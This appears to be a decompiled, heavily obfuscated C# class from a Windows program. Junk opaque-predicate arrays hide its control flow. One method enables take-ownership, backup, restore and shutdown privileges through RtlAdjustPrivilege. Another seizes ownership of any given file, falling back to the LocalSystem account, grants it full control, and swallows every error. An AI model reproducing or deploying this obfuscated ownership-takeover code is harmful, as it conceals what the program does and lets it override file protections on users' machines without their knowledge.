using System;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;

namespace ns0;

public static class GClass7
{
	public static void smethod_0()
	{
		int i = 0;
		object[] array = new object[5]
		{
			new int[6] { 90, -630706777, 90, 630706880, 10, 180 },
			new int[9] { 90, 107732936, 90, 738439763, 20, 90, 630706880, 10, 180 },
			new int[12]
			{
				90, -1268201081, 90, 1375934108, 10, 90, 738439763, 20, 90, 630706880,
				10, 180
			},
			new int[12]
			{
				90, -1268201092, 90, 1375934108, 10, 90, 738439763, 20, 90, 630706880,
				10, 180
			},
			new int[6] { 90, -630706811, 90, 630706880, 10, 180 }
		};
		for (; i < 5; i++)
		{
			int num = jjs9HVgylZcfR0.Op3pRI0B28vZwOn((int[])array[i], 0, 0);
			if (num == 68 || num != 133)
			{
				continue;
			}
			try
			{
				bool bool_ = false;
				int j = 0;
				object[] array2 = new object[15]
				{
					new int[6] { 90, -630706612, 90, 630706880, 10, 180 },
					new int[9] { 90, 107733076, 90, 738439763, 20, 90, 630706880, 10, 180 },
					new int[9] { 90, 107732898, 90, 738439763, 20, 90, 630706880, 10, 180 },
					new int[6] { 90, -630706583, 90, 630706880, 10, 180 },
					new int[9] { 90, 107733225, 90, 738439763, 20, 90, 630706880, 10, 180 },
					new int[9] { 90, 107733228, 90, 738439763, 20, 90, 630706880, 10, 180 },
					new int[6] { 90, -630706670, 90, 630706880, 10, 180 },
					new int[6] { 90, -630706618, 90, 630706880, 10, 180 },
					new int[12]
					{
						90, -1268201027, 90, 1375934108, 10, 90, 738439763, 20, 90, 630706880,
						10, 180
					},
					new int[12]
					{
						90, -1268201048, 90, 1375934108, 10, 90, 738439763, 20, 90, 630706880,
						10, 180
					},
					new int[9] { 90, 107733149, 90, 738439763, 20, 90, 630706880, 10, 180 },
					new int[12]
					{
						90, -1268200983, 90, 1375934108, 10, 90, 738439763, 20, 90, 630706880,
						10, 180
					},
					new int[9] { 90, 107733033, 90, 738439763, 20, 90, 630706880, 10, 180 },
					new int[6] { 90, -630706557, 90, 630706880, 10, 180 },
					new int[12]
					{
						90, -1268201169, 90, 1375934108, 10, 90, 738439763, 20, 90, 630706880,
						10, 180
					}
				};
				for (; j < 15; j++)
				{
					switch (jjs9HVgylZcfR0.Op3pRI0B28vZwOn((int[])array2[j], 0, 0))
					{
					case 193:
						GClass6.RtlAdjustPrivilege(9uL, bool_0: true, bool_1: false, ref bool_);
						break;
					case 177:
						GClass6.RtlAdjustPrivilege(18uL, bool_0: true, bool_1: false, ref bool_);
						break;
					case 297:
						GClass6.RtlAdjustPrivilege(17uL, bool_0: true, bool_1: false, ref bool_);
						break;
					case 242:
						GClass6.RtlAdjustPrivilege(19uL, bool_0: true, bool_1: false, ref bool_);
						break;
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	public static void smethod_1(string string_0)
	{
		int i = 0;
		object[] array = new object[5]
		{
			new int[9] { 90, 107732894, 90, 738439763, 20, 90, 630706880, 10, 180 },
			new int[12]
			{
				90, -1268201066, 90, 1375934108, 10, 90, 738439763, 20, 90, 630706880,
				10, 180
			},
			new int[9] { 90, 107733043, 90, 738439763, 20, 90, 630706880, 10, 180 },
			new int[9] { 90, 107732969, 90, 738439763, 20, 90, 630706880, 10, 180 },
			new int[9] { 90, 107732972, 90, 738439763, 20, 90, 630706880, 10, 180 }
		};
		for (; i < 5; i++)
		{
			switch (jjs9HVgylZcfR0.Op3pRI0B28vZwOn((int[])array[i], 0, 0))
			{
			case 86:
				try
				{
					SecurityIdentifier securityIdentifier = WindowsIdentity.GetCurrent().User;
					int j = 0;
					object[] array2 = new object[5]
					{
						new int[12]
						{
							90, -1268201064, 90, 1375934108, 10, 90, 738439763, 20, 90, 630706880,
							10, 180
						},
						new int[6] { 90, -630706872, 90, 630706880, 10, 180 },
						new int[9] { 90, 107732892, 90, 738439763, 20, 90, 630706880, 10, 180 },
						new int[9] { 90, 107733076, 90, 738439763, 20, 90, 630706880, 10, 180 },
						new int[9] { 90, 107733047, 90, 738439763, 20, 90, 630706880, 10, 180 }
					};
					for (; j < 5; j++)
					{
						int num = jjs9HVgylZcfR0.Op3pRI0B28vZwOn((int[])array2[j], 0, 0);
						if (num == 163 || num != 193 || !(securityIdentifier == null))
						{
							continue;
						}
						int k = 0;
						object[] array3 = new object[5]
						{
							new int[6] { 90, -630706840, 90, 630706880, 10, 180 },
							new int[6] { 90, -630706832, 90, 630706880, 10, 180 },
							new int[6] { 90, -630706874, 90, 630706880, 10, 180 },
							new int[6] { 90, -630706838, 90, 630706880, 10, 180 },
							new int[6] { 90, -630706845, 90, 630706880, 10, 180 }
						};
						for (; k < 5; k++)
						{
							int num2 = jjs9HVgylZcfR0.Op3pRI0B28vZwOn((int[])array3[k], 0, 0);
							if (num2 != 34 && num2 == 42)
							{
								securityIdentifier = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
							}
						}
					}
					FileSecurity accessControl = File.GetAccessControl(string_0);
					int l = 0;
					object[] array4 = new object[13]
					{
						new int[9] { 90, 107733036, 90, 738439763, 20, 90, 630706880, 10, 180 },
						new int[9] { 90, 107733266, 90, 738439763, 20, 90, 630706880, 10, 180 },
						new int[6] { 90, -630706470, 90, 630706880, 10, 180 },
						new int[9] { 90, 107733196, 90, 738439763, 20, 90, 630706880, 10, 180 },
						new int[9] { 90, 107733187, 90, 738439763, 20, 90, 630706880, 10, 180 },
						new int[9] { 90, 107733300, 90, 738439763, 20, 90, 630706880, 10, 180 },
						new int[12]
						{
							90, -1268200812, 90, 1375934108, 10, 90, 738439763, 20, 90, 630706880,
							10, 180
						},
						new int[6] { 90, -630706867, 90, 630706880, 10, 180 },
						new int[6] { 90, -630706780, 90, 630706880, 10, 180 },
						new int[9] { 90, 107732887, 90, 738439763, 20, 90, 630706880, 10, 180 },
						new int[9] { 90, 107733288, 90, 738439763, 20, 90, 630706880, 10, 180 },
						new int[6] { 90, -630706593, 90, 630706880, 10, 180 },
						new int[12]
						{
							90, -1268200783, 90, 1375934108, 10, 90, 738439763, 20, 90, 630706880,
							10, 180
						}
					};
					for (; l < 13; l++)
					{
						switch (jjs9HVgylZcfR0.Op3pRI0B28vZwOn((int[])array4[l], 0, 0))
						{
						case 153:
							accessControl.SetOwner(securityIdentifier);
							break;
						case 4:
							File.SetAccessControl(string_0, accessControl);
							break;
						case 442:
							File.SetAccessControl(string_0, accessControl);
							break;
						case 405:
							accessControl = File.GetAccessControl(string_0);
							break;
						case 287:
							accessControl.AddAccessRule(new FileSystemAccessRule(securityIdentifier, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow));
							break;
						}
					}
				}
				catch (Exception)
				{
				}
				break;
			}
		}
	}
}
